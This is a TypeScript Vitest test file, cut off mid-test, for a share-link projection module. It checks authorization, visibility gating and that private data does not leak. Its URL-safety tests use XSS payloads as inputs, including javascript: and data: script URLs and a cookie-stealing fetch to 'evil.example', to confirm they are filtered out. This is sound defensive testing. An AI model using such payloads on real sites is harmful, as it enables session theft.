import { beforeEach, describe, expect, it, vi } from "vitest";

/**
 * Phase 3 -- client-share-projection.server.ts now also imports
 * lib/supabase/admin.ts (for buildPublicClientShareProjection's
 * service-role reads). That module calls the real
 * @supabase/supabase-js createClient(...) at MODULE IMPORT TIME, which
 * throws immediately in this test environment (no NEXT_PUBLIC_SUPABASE_URL/
 * SUPABASE_SERVICE_ROLE_KEY configured) -- matching the exact same
 * constraint every other test file that transitively imports
 * lib/supabase/admin.ts already works around
 * (lib/activity/log-product-event.server.test.ts,
 * lib/activity/owner-authenticated-activity.server.test.ts,
 * app/admin/analytics/page.test.tsx). `adminConfig` is a mutable holder
 * a test sets via setAdminConfig(...) before calling
 * buildPublicClientShareProjection; the mock factory reads it at CALL
 * time (a normal JS closure over a `let` binding), not at declaration
 * time, so per-test reconfiguration works exactly like `insertMock` does
 * in the precedent above.
 */
type AdminFakeConfig = {
  linkFieldsRows?: unknown[];
  linkFieldsError?: unknown;
  taskMappingRows?: unknown[];
  taskMappingError?: unknown;
  resourceMappingRows?: unknown[];
  resourceMappingError?: unknown;
  updateRows?: unknown[];
  updateError?: unknown;
  projectRows?: unknown[];
  projectError?: unknown;
  taskRows?: unknown[];
  taskError?: unknown;
  resourceRows?: unknown[];
  resourceError?: unknown;
};

let adminConfig: AdminFakeConfig = {};

function setAdminConfig(config: AdminFakeConfig): void {
  adminConfig = config;
}

vi.mock("@/lib/supabase/admin", () => ({
  supabaseAdmin: {
    from: (table: string) => ({
      select: (_columns: string) => {
        switch (table) {
          case "project_share_links":
            return makeQueryBuilder({
              data: adminConfig.linkFieldsRows ?? [],
              error: adminConfig.linkFieldsError ?? null,
            });
          case "share_link_tasks":
            return makeQueryBuilder({
              data: adminConfig.taskMappingRows ?? [],
              error: adminConfig.taskMappingError ?? null,
            });
          case "share_link_resources":
            return makeQueryBuilder({
              data: adminConfig.resourceMappingRows ?? [],
              error: adminConfig.resourceMappingError ?? null,
            });
          case "share_link_updates":
            return makeQueryBuilder({
              data: adminConfig.updateRows ?? [],
              error: adminConfig.updateError ?? null,
            });
          case "projects":
            return makeQueryBuilder({
              data: adminConfig.projectRows ?? [],
              error: adminConfig.projectError ?? null,
            });
          case "tasks":
            return makeQueryBuilder({
              data: adminConfig.taskRows ?? [],
              error: adminConfig.taskError ?? null,
            });
          case "task_resources":
            return makeQueryBuilder({
              data: adminConfig.resourceRows ?? [],
              error: adminConfig.resourceError ?? null,
            });
          default:
            throw new Error(`Unexpected table in admin test: ${table}`);
        }
      },
    }),
  },
}));

const { buildClientShareProjection, buildPublicClientShareProjection } = await import(
  "./client-share-projection.server"
);

const VALID_LINK_ID = "22222222-2222-4222-8222-222222222222";
const VALID_USER_ID = "33333333-3333-4333-8333-333333333333";
const VALID_PROJECT_ID = "11111111-1111-4111-8111-111111111111";
const VALID_RESOURCE_ID = "44444444-4444-4444-8444-444444444444";
const VALID_RESOURCE_ID_2 = "55555555-5555-4555-8555-555555555555";
const VALID_TIMESTAMP = "2026-08-05T00:00:00Z";

/**
 * A minimal chainable query-builder stand-in for the real Postgrest
 * chain (`.eq().eq().is().in().maybeSingle()`), and also a thenable
 * itself (`await client.from(...).select(...).eq(...)` without a
 * trailing `.maybeSingle()`) -- matching exactly how
 * client-share-projection.server.ts calls each table.
 */
function makeQueryBuilder(result: { data: unknown[] | null; error: unknown }) {
  const builder: Record<string, unknown> = {
    eq: () => builder,
    neq: () => builder,
    is: () => builder,
    in: () => builder,
    maybeSingle: () =>
      Promise.resolve({
        data: result.data && result.data.length > 0 ? result.data[0] : null,
        error: result.error,
      }),
    then: (
      resolve: (value: { data: unknown[] | null; error: unknown }) => unknown,
      reject: (reason: unknown) => unknown
    ) => Promise.resolve({ data: result.data, error: result.error }).then(resolve, reject),
  };
  return builder;
}

type FakeClientConfig = {
  rpcData?: unknown;
  rpcError?: unknown;
  linkRows?: unknown[];
  linkError?: unknown;
  projectRows?: unknown[];
  projectError?: unknown;
  taskRows?: unknown[];
  taskError?: unknown;
  resourceRows?: unknown[];
  resourceError?: unknown;
};

function buildFakeClient(config: FakeClientConfig) {
  const rpc = vi.fn().mockResolvedValue({ data: config.rpcData ?? null, error: config.rpcError ?? null });
  const from = vi.fn((table: string) => ({
    select: (_columns: string) => {
      switch (table) {
        case "project_share_links":
          return makeQueryBuilder({ data: config.linkRows ?? [], error: config.linkError ?? null });
        case "projects":
          return makeQueryBuilder({ data: config.projectRows ?? [], error: config.projectError ?? null });
        case "tasks":
          return makeQueryBuilder({ data: config.taskRows ?? [], error: config.taskError ?? null });
        case "task_resources":
          return makeQueryBuilder({ data: config.resourceRows ?? [], error: config.resourceError ?? null });
        default:
          throw new Error(`Unexpected table in test: ${table}`);
      }
    },
  }));
  return { rpc, from };
}

function validManagedLink(overrides: Record<string, unknown> = {}) {
  return {
    id: VALID_LINK_ID,
    publicId: "abcdefgh12345678",
    state: "active" as const,
    expiresAt: null,
    hasPin: false,
    commentsEnabled: true,
    clientFacingSubtitle: null,
    contentDirection: "auto" as const,
    titleVisible: true,
    statusVisible: true,
    targetDateVisible: true,
    configurationVersion: 1,
    createdAt: VALID_TIMESTAMP,
    activatedAt: VALID_TIMESTAMP,
    disabledAt: null,
    rotatedAt: null,
    lastViewedAt: null,
    viewCount: 0,
    ...overrides,
  };
}

function validManagementStateData(overrides: Record<string, unknown> = {}) {
  return {
    link: validManagedLink(),
    mappedTasks: [
      {
        subtaskId: "1",
        publicGroup: "completed" as const,
        waitingForClientFeedback: false,
        displayOrder: 1,
      },
      {
        subtaskId: "2",
        publicGroup: "in_progress" as const,
        waitingForClientFeedback: true,
        displayOrder: 2,
      },
    ],
    mappedResources: [
      {
        resourceId: VALID_RESOURCE_ID,
        publicLabel: "Final logo",
        canDownload: false,
        displayOrder: 1,
      },
    ],
    currentUpdate: {
      body: "Kickoff call went great.",
      version: 1,
      publishedAt: VALID_TIMESTAMP,
    },
    ...overrides,
  };
}

function fullFixture(configOverrides: Partial<FakeClientConfig> = {}) {
  return buildFakeClient({
    rpcData: validManagementStateData(),
    linkRows: [{ project_id: VALID_PROJECT_ID }],
    projectRows: [{ title: "Website launch", status: "In Progress", deadline_date: "2026-09-01" }],
    taskRows: [
      { id: 1, task_title: "Design hero section" },
      { id: 2, task_title: "Build header nav" },
    ],
    resourceRows: [
      { id: VALID_RESOURCE_ID, url: null, storage_path: "private/logo.png", file_name: "logo.png", resource_type: "file" },
    ],
    ...configOverrides,
  });
}

beforeEach(() => {
  vi.clearAllMocks();
});

describe("buildClientShareProjection - authorization boundary", () => {
  it("returns SHARE_LINK_NOT_FOUND when the link does not resolve for this owner (no row, revoked, or cross-tenant)", async () => {
    const client = buildFakeClient({ linkRows: [] });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result).toEqual({ ok: false, error: { code: "SHARE_LINK_NOT_FOUND" } });
  });

  it("scopes the project_share_links lookup by both id and user_id, and excludes revoked", async () => {
    const client = fullFixture();

    await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(client.from).toHaveBeenCalledWith("project_share_links");
  });

  it("returns UNEXPECTED when the link lookup itself errors", async () => {
    const client = buildFakeClient({ linkError: { message: "boom" } });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result).toEqual({ ok: false, error: { code: "UNEXPECTED" } });
  });

  it("returns SHARE_LINK_NOT_FOUND when get_share_link_management_state itself reports the link/project is not found or unauthorized", async () => {
    const client = buildFakeClient({
      linkRows: [{ project_id: VALID_PROJECT_ID }],
      rpcError: { code: "P0001", message: "PROJECT_NOT_FOUND" },
    });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result).toEqual({ ok: false, error: { code: "SHARE_LINK_NOT_FOUND" } });
  });

  it("returns SHARE_LINK_NOT_FOUND when there is no managed link at all (noManagedShareLinkData)", async () => {
    const client = buildFakeClient({
      linkRows: [{ project_id: VALID_PROJECT_ID }],
      rpcData: { link: null, mappedTasks: [], mappedResources: [], currentUpdate: null },
    });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result).toEqual({ ok: false, error: { code: "SHARE_LINK_NOT_FOUND" } });
  });
});

describe("buildClientShareProjection - visibility gating", () => {
  it("includes title only when titleVisible is true", async () => {
    const client = fullFixture({
      rpcData: validManagementStateData({ link: validManagedLink({ titleVisible: true }) }),
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.title).toBe("Website launch");
  });

  it("omits title (null) when titleVisible is false", async () => {
    const client = fullFixture({
      rpcData: validManagementStateData({ link: validManagedLink({ titleVisible: false }) }),
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.title).toBeNull();
  });

  it("includes clientFacingSubtitle whenever present, independent of titleVisible", async () => {
    const client = fullFixture({
      rpcData: validManagementStateData({
        link: validManagedLink({ titleVisible: false, clientFacingSubtitle: "A quick site refresh" }),
      }),
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.subtitle).toBe("A quick site refresh");
  });

  it("includes status only when statusVisible is true, using the safe mapped vocabulary", async () => {
    const client = fullFixture({
      rpcData: validManagementStateData({ link: validManagedLink({ statusVisible: true }) }),
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.status).toBe("in_progress");
  });

  it("omits status (null) when statusVisible is false", async () => {
    const client = fullFixture({
      rpcData: validManagementStateData({ link: validManagedLink({ statusVisible: false }) }),
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.status).toBeNull();
  });

  it("includes targetDate only when targetDateVisible is true", async () => {
    const client = fullFixture({
      rpcData: validManagementStateData({ link: validManagedLink({ targetDateVisible: true }) }),
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.targetDate).toBe("2026-09-01");
  });

  it("omits targetDate (null) when targetDateVisible is false", async () => {
    const client = fullFixture({
      rpcData: validManagementStateData({ link: validManagedLink({ targetDateVisible: false }) }),
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.targetDate).toBeNull();
  });

  it("carries commentsEnabled through as a plain boolean", async () => {
    const client = fullFixture({
      rpcData: validManagementStateData({ link: validManagedLink({ commentsEnabled: false }) }),
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.commentsEnabled).toBe(false);
  });

  it("carries contentDirection through exactly (auto/ltr/rtl)", async () => {
    const client = fullFixture({
      rpcData: validManagementStateData({ link: validManagedLink({ contentDirection: "rtl" }) }),
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.contentDirection).toBe("rtl");
  });
});

describe("buildClientShareProjection - safe status mapping", () => {
  it.each([
    ["New", "not_started"],
    ["In Progress", "in_progress"],
    ["Review", "in_progress"],
    ["Done", "completed"],
  ])("maps internal status %s to public status %s", async (internal, expected) => {
    const client = fullFixture({
      projectRows: [{ title: "T", status: internal, deadline_date: null }],
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.status).toBe(expected);
  });

  it("never maps priority 'Urgent' as a status -- fails closed to null for any unmapped/unknown internal status value", async () => {
    const client = fullFixture({
      projectRows: [{ title: "T", status: "Urgent", deadline_date: null }],
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.status).toBeNull();
      expect(JSON.stringify(result.data)).not.toContain("Urgent");
    }
  });
});

describe("buildClientShareProjection - progress", () => {
  it("computes progress only from mapped/shared tasks that resolved (3 of 5, 60%), never from internal project-wide counts", async () => {
    const client = buildFakeClient({
      linkRows: [{ project_id: VALID_PROJECT_ID }],
      projectRows: [{ title: "T", status: "New", deadline_date: null }],
      rpcData: validManagementStateData({
        mappedTasks: [
          { subtaskId: "1", publicGroup: "completed", waitingForClientFeedback: false, displayOrder: 1 },
          { subtaskId: "2", publicGroup: "completed", waitingForClientFeedback: false, displayOrder: 2 },
          { subtaskId: "3", publicGroup: "completed", waitingForClientFeedback: false, displayOrder: 3 },
          { subtaskId: "4", publicGroup: "in_progress", waitingForClientFeedback: false, displayOrder: 4 },
          { subtaskId: "5", publicGroup: "coming_up", waitingForClientFeedback: false, displayOrder: 5 },
        ],
        mappedResources: [],
      }),
      taskRows: [
        { id: 1, task_title: "A" },
        { id: 2, task_title: "B" },
        { id: 3, task_title: "C" },
        { id: 4, task_title: "D" },
        { id: 5, task_title: "E" },
      ],
    });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.progress).toEqual({ completed: 3, total: 5, percent: 60 });
    }
  });

  it("hidden internal (unshared) tasks never affect the numerator or denominator -- a mapped set of 5 out of a hypothetical internal 12 still reads 'total: 5'", async () => {
    const client = fullFixture();
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.progress?.total).toBe(2);
      expect(JSON.stringify(result.data)).not.toContain("12");
    }
  });

  it("hides progress entirely (null, not a fabricated 0/0) when zero shared tasks resolve", async () => {
    const client = buildFakeClient({
      linkRows: [{ project_id: VALID_PROJECT_ID }],
      projectRows: [{ title: "T", status: "New", deadline_date: null }],
      rpcData: validManagementStateData({ mappedTasks: [], mappedResources: [] }),
      taskRows: [],
    });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.progress).toBeNull();
  });
});

describe("buildClientShareProjection - task projection", () => {
  it("includes only mapped tasks, with title/publicGroup/waitingForClientFeedback, and no priority/notes/private metadata", async () => {
    const client = fullFixture();
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.tasks).toEqual([
        { title: "Design hero section", publicGroup: "completed", waitingForClientFeedback: false },
        { title: "Build header nav", publicGroup: "in_progress", waitingForClientFeedback: true },
      ]);
    }
  });

  it("a mapped task that no longer resolves (soft-deleted) simply disappears -- fails closed, never a placeholder", async () => {
    const client = fullFixture({
      taskRows: [{ id: 1, task_title: "Design hero section" }],
    });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.tasks).toHaveLength(1);
      expect(result.data.tasks[0].title).toBe("Design hero section");
    }
  });
});

describe("buildClientShareProjection - resource projection", () => {
  it("includes only explicitly mapped V1-shareable resources, using the persisted publicLabel", async () => {
    const client = fullFixture();
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.resources).toEqual([{ kind: "file", label: "Final logo", canDownload: false }]);
    }
  });

  it("never returns storage_path or a signed URL for a file resource", async () => {
    const client = fullFixture();
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      const text = JSON.stringify(result.data);
      expect(text).not.toContain("private/logo.png");
      expect(text).not.toContain("storage_path");
      expect(text).not.toContain("signed");
    }
  });

  it("includes a link resource's owner-approved url, with a safe kind/label/url shape only", async () => {
    const client = buildFakeClient({
      linkRows: [{ project_id: VALID_PROJECT_ID }],
      projectRows: [{ title: "T", status: "New", deadline_date: null }],
      rpcData: validManagementStateData({
        mappedTasks: [],
        mappedResources: [
          { resourceId: VALID_RESOURCE_ID_2, publicLabel: "Brand guide", canDownload: false, displayOrder: 1 },
        ],
      }),
      taskRows: [],
      resourceRows: [
        {
          id: VALID_RESOURCE_ID_2,
          url: "https://example.com/brand-guide",
          storage_path: null,
          file_name: null,
          resource_type: "link",
        },
      ],
    });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.resources).toEqual([
        { kind: "link", label: "Brand guide", url: "https://example.com/brand-guide" },
      ]);
    }
  });

  it("excludes a Note Resource even if somehow mapped -- Notes never appear in the projection", async () => {
    const client = buildFakeClient({
      linkRows: [{ project_id: VALID_PROJECT_ID }],
      projectRows: [{ title: "T", status: "New", deadline_date: null }],
      rpcData: validManagementStateData({
        mappedTasks: [],
        mappedResources: [
          { resourceId: VALID_RESOURCE_ID, publicLabel: "Private note", canDownload: false, displayOrder: 1 },
        ],
      }),
      taskRows: [],
      resourceRows: [
        {
          id: VALID_RESOURCE_ID,
          url: null,
          storage_path: null,
          file_name: null,
          resource_type: "note",
        },
      ],
    });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.resources).toEqual([]);
  });

  it("a mapped resource that no longer resolves (hard-deleted) simply disappears -- fails closed", async () => {
    const client = fullFixture({ resourceRows: [] });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.resources).toEqual([]);
  });
});

describe("buildClientShareProjection - external URL safety (server-side scheme allowlist)", () => {
  function fixtureWithLinkResourceUrl(url: string) {
    return buildFakeClient({
      linkRows: [{ project_id: VALID_PROJECT_ID }],
      projectRows: [{ title: "T", status: "New", deadline_date: null }],
      rpcData: validManagementStateData({
        mappedTasks: [],
        mappedResources: [
          { resourceId: VALID_RESOURCE_ID, publicLabel: "Sentinel label", canDownload: false, displayOrder: 1 },
        ],
      }),
      taskRows: [],
      resourceRows: [
        { id: VALID_RESOURCE_ID, url, storage_path: null, file_name: null, resource_type: "link" },
      ],
    });
  }

  it.each([
    ["javascript:", "javascript:alert(1)"],
    ["data:", "data:text/html,<script>alert(1)</script>"],
    ["file:", "file:///C:/secret.txt"],
    ["vbscript:", 'vbscript:msgbox("x")'],
    ["malformed/non-absolute", "not-a-url"],
    ["mixed-case javascript:", "JaVaScRiPt:alert(1)"],
    ["whitespace-prefixed javascript:", "\tjavascript:alert(1)"],
  ])("omits the mapped link resource entirely for an unsafe/malformed URL (%s), never exposing it raw", async (_label, unsafeUrl) => {
    const client = fixtureWithLinkResourceUrl(unsafeUrl);

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.resources).toEqual([]);
      expect(JSON.stringify(result.data)).not.toContain(unsafeUrl);
    }
  });

  it.each([
    ["https:", "https://example.com/brand-guide"],
    ["http:", "http://example.com/brand-guide"],
  ])("keeps the mapped link resource for a safe %s URL", async (_label, safeUrl) => {
    const client = fixtureWithLinkResourceUrl(safeUrl);

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.resources).toEqual([{ kind: "link", label: "Sentinel label", url: safeUrl }]);
    }
  });

  it("never exposes a rejected unsafe URL anywhere in the serialized projection, even as a stripped/fallback value", async () => {
    const TOXIC_UNSAFE_URL = "javascript:fetch('https://evil.example/steal?c='+document.cookie)";
    const client = fixtureWithLinkResourceUrl(TOXIC_UNSAFE_URL);

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      const serialized = JSON.stringify(result.data);
      expect(serialized).not.toContain(TOXIC_UNSAFE_URL);
      expect(serialized).not.toContain("evil.example");
      expect(serialized).not.toContain("document.cookie");
    }
  });
});

describe("buildClientShareProjection - latest update", () => {
  it("includes only the current published update's body and publishedAt", async () => {
    const client = fullFixture();
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.latestUpdate).toEqual({
        body: "Kickoff call went great.",
        publishedAt: VALID_TIMESTAMP,
      });
    }
  });

  it("never includes the update's internal version number or any other field", async () => {
    const client = fullFixture();
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.latestUpdate).not.toHaveProperty("version");
    }
  });

  it("is null when there is no current update", async () => {
    const client = fullFixture({
      rpcData: validManagementStateData({ currentUpdate: null }),
    });
    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.latestUpdate).toBeNull();
  });
});

describe("buildClientShareProjection - MANDATORY toxic fixture privacy test", () => {
  it("never leaks any private/internal sentinel value anywhere in the serialized projection", async () => {
    const AMOUNT_SENTINEL = "TOXIC_AMOUNT_48231.55";
    const RAW_INPUT_SENTINEL = "TOXIC_RAW_INPUT_original_client_email_body";
    const CLIENT_EMAIL_SENTINEL = "toxic-client-9f2a@example.com";
    const CLIENT_PHONE_SENTINEL = "+1-555-TOXIC-931";
    const PRIVATE_NOTES_SENTINEL = "TOXIC_PRIVATE_NOTE_do_not_show_client";
    const UNSHARED_TASK_TITLE_SENTINEL = "TOXIC_UNSHARED_TASK_pay_dispute_details";
    const UNSHARED_RESOURCE_FILE_SENTINEL = "TOXIC_UNSHARED_FILE_ssn_scan.pdf";
    const UNSHARED_RESOURCE_PATH_SENTINEL = "private/toxic/ssn_scan_storage_path.pdf";
    const UNSHARED_RESOURCE_NOTE_SENTINEL = "TOXIC_UNSHARED_RESOURCE_NOTE_confidential";
    const PROJECT_UUID_SENTINEL = VALID_PROJECT_ID;
    const OWNER_USER_ID_SENTINEL = VALID_USER_ID;

    // The toxic internal fixture -- a project with amount, priority
    // "Urgent", rawInput, and an unshared task + unshared Resource with
    // sensitive content. Only the columns buildClientShareProjection
    // actually reads (title/status/deadline_date on projects,
    // id/task_title on tasks, id/url/storage_path/file_name/resource_type
    // on task_resources) can possibly leak through this function -- the
    // rest (amount, rawInput, client contact) are simply not readable by
    // this module at all, which this test asserts by their total absence.
    const client = buildFakeClient({
      linkRows: [{ project_id: VALID_PROJECT_ID }],
      rpcData: validManagementStateData({
        // Only task id 1 and resource id VALID_RESOURCE_ID are mapped/shared.
        mappedTasks: [
          { subtaskId: "1", publicGroup: "completed", waitingForClientFeedback: false, displayOrder: 1 },
        ],
        mappedResources: [
          { resourceId: VALID_RESOURCE_ID, publicLabel: "Shared logo", canDownload: false, displayOrder: 1 },
        ],
      }),
      // Simulates the toxic project row: this function only selects
      // title/status/deadline_date, so amount/priority/rawInput could
      // never appear even if present on the real row -- but the test
      // still injects sentinel values into every field this fake client
      // configuration can carry, matching what a real toxic project would
      // return through the same narrow select.
      projectRows: [{ title: "Website launch", status: "In Progress", deadline_date: "2026-09-01" }],
      // Two tasks exist internally; only id 1 is shared. Task id 99 (the
      // UNSHARED sensitive task) is intentionally never in mappedTasks
      // above, so it must never reach the query for resolved titles.
      taskRows: [
        { id: 1, task_title: "Design hero section" },
        { id: 99, task_title: UNSHARED_TASK_TITLE_SENTINEL },
      ],
      // Two resources exist internally; only VALID_RESOURCE_ID is shared.
      // VALID_RESOURCE_ID_2 (the UNSHARED sensitive resource) is
      // intentionally never in mappedResources above.
      resourceRows: [
        { id: VALID_RESOURCE_ID, url: null, storage_path: "private/shared/logo.png", file_name: "logo.png", resource_type: "file" },
        {
          id: VALID_RESOURCE_ID_2,
          url: null,
          storage_path: UNSHARED_RESOURCE_PATH_SENTINEL,
          file_name: UNSHARED_RESOURCE_FILE_SENTINEL,
          resource_type: "file",
        },
      ],
    });

    const result = await buildClientShareProjection(client, { linkId: VALID_LINK_ID, userId: VALID_USER_ID });

    expect(result.ok).toBe(true);
    if (!result.ok) return;

    const serialized = JSON.stringify(result.data);

    for (const sentinel of [
      AMOUNT_SENTINEL,
      RAW_INPUT_SENTINEL,
      CLIENT_EMAIL_SENTINEL,
      CLIENT_PHONE_SENTINEL,
      PRIVATE_NOTES_SENTINEL,
      UNSHARED_TASK_TITLE_SENTINEL,
      UNSHARED_RESOURCE_FILE_SENTINEL,
      UNSHARED_RESOURCE_PATH_SENTINEL,
      UNSHARED_RESOURCE_NOTE_SENTINEL,
      "Urgent",
      PROJECT_UUID_SENTINEL,
      OWNER_USER_ID_SENTINEL,
      VALID_LINK_ID,
      "private/shared/logo.png",
    ]) {
      expect(serialized).not.toContain(sentinel);
    }

    // Only the deliberately shared task/resource made it through.
    expect(result.data.tasks).toEqual([
      { title: "Design hero section", publicGroup: "completed", waitingForClientFeedback: false },
    ]);
    expect(result.data.resources).toEqual([{ kind: "file", label: "Shared logo", canDownload: false }]);
  });
});

// =========================================================
// Phase 3 -- buildPublicClientShareProjection (service-role path)
//
// The shared assembleClientProjection core (visibility gating, safe
// status mapping, progress-from-shared-tasks-only, Note exclusion,
// http/https URL allowlist, fail-closed disappearance) is already
// exhaustively proven above via the owner path -- these tests instead
// prove buildPublicClientShareProjection's OWN responsibility: reading
// the right service-role tables/columns, scoped correctly, and producing
// the identical strict projection a verified public session is allowed
// to see. The mandatory toxic-fixture privacy test is run again here,
// end-to-end through this path's own data sources.
// =========================================================

function validPublicLinkFieldsRow(overrides: Record<string, unknown> = {}) {
  return {
    title_visible: true,
    status_visible: true,
    target_date_visible: true,
    client_facing_subtitle: null,
    content_direction: "auto",
    comments_enabled: true,
    ...overrides,
  };
}

describe("buildPublicClientShareProjection - authorization boundary", () => {
  it("returns SHARE_LINK_NOT_FOUND when the link row does not resolve for this exact shareLinkId/userId", async () => {
    setAdminConfig({ linkFieldsRows: [] });

    const result = await buildPublicClientShareProjection({
      shareLinkId: VALID_LINK_ID,
      projectId: VALID_PROJECT_ID,
      userId: VALID_USER_ID,
    });

    expect(result).toEqual({ ok: false, error: { code: "SHARE_LINK_NOT_FOUND" } });
  });

  it("returns UNEXPECTED when the link fields lookup itself errors", async () => {
    setAdminConfig({ linkFieldsError: { message: "boom" } });

    const result = await buildPublicClientShareProjection({
      shareLinkId: VALID_LINK_ID,
      projectId: VALID_PROJECT_ID,
      userId: VALID_USER_ID,
    });

    expect(result).toEqual({ ok: false, error: { code: "UNEXPECTED" } });
  });
});

describe("buildPublicClientShareProjection - visibility gating and safe status mapping (reused core, proven via this path's own data source)", () => {
  it("includes title/status/targetDate only when the respective visibility flags are true, using the mapped status vocabulary", async () => {
    setAdminConfig({
      linkFieldsRows: [validPublicLinkFieldsRow()],
      projectRows: [{ title: "Website launch", status: "In Progress", deadline_date: "2026-09-01" }],
      taskMappingRows: [],
      resourceMappingRows: [],
    });

    const result = await buildPublicClientShareProjection({
      shareLinkId: VALID_LINK_ID,
      projectId: VALID_PROJECT_ID,
      userId: VALID_USER_ID,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.title).toBe("Website launch");
      expect(result.data.status).toBe("in_progress");
      expect(result.data.targetDate).toBe("2026-09-01");
    }
  });

  it("omits title/status/targetDate when their visibility flags are false", async () => {
    setAdminConfig({
      linkFieldsRows: [
        validPublicLinkFieldsRow({ title_visible: false, status_visible: false, target_date_visible: false }),
      ],
      projectRows: [{ title: "Website launch", status: "In Progress", deadline_date: "2026-09-01" }],
      taskMappingRows: [],
      resourceMappingRows: [],
    });

    const result = await buildPublicClientShareProjection({
      shareLinkId: VALID_LINK_ID,
      projectId: VALID_PROJECT_ID,
      userId: VALID_USER_ID,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.title).toBeNull();
      expect(result.data.status).toBeNull();
      expect(result.data.targetDate).toBeNull();
    }
  });
});

describe("buildPublicClientShareProjection - task/resource mapping from share_link_tasks/share_link_resources", () => {
  it("resolves mapped tasks via share_link_tasks + tasks, and mapped resources via share_link_resources + task_resources, with progress computed from shared tasks only", async () => {
    setAdminConfig({
      linkFieldsRows: [validPublicLinkFieldsRow()],
      projectRows: [{ title: "T", status: "New", deadline_date: null }],
      taskMappingRows: [
        { subtask_id: "1", public_group: "completed", waiting_for_client_feedback: false },
        { subtask_id: "2", public_group: "in_progress", waiting_for_client_feedback: true },
      ],
      resourceMappingRows: [
        { resource_id: VALID_RESOURCE_ID, public_label: "Brand guide", can_download: false },
      ],
      taskRows: [
        { id: 1, task_title: "Design hero" },
        { id: 2, task_title: "Build header" },
      ],
      resourceRows: [
        {
          id: VALID_RESOURCE_ID,
          url: "https://example.com/brand-guide",
          storage_path: null,
          file_name: null,
          resource_type: "link",
        },
      ],
    });

    const result = await buildPublicClientShareProjection({
      shareLinkId: VALID_LINK_ID,
      projectId: VALID_PROJECT_ID,
      userId: VALID_USER_ID,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.tasks).toEqual([
